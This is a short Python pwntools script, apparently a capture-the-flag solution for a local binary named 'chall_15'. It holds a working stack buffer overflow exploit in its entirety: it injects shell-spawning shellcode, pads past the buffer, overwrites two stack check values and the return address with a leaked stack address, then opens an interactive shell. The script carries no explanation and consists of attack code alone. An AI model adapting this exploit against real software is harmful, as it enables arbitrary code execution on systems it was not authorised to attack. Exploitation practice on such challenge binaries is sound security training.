# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_15")
    context.arch= "amd64"
    asm_shell= asm(shellcraft.sh())
    proc.recvuntil("Sometimes the canary is in the coal mine, sometimes the canary is on the stack, and sometimes ... baked beans")
    of= proc.recv()
    p= asm_shell+ b'A'*232+ p32(0xdeadd00d)+p32(0xb16b00b5)+b'A'*8+ p64(int(of, 16))
    proc.sendline(p)
    proc.interactive()
    
exploit()
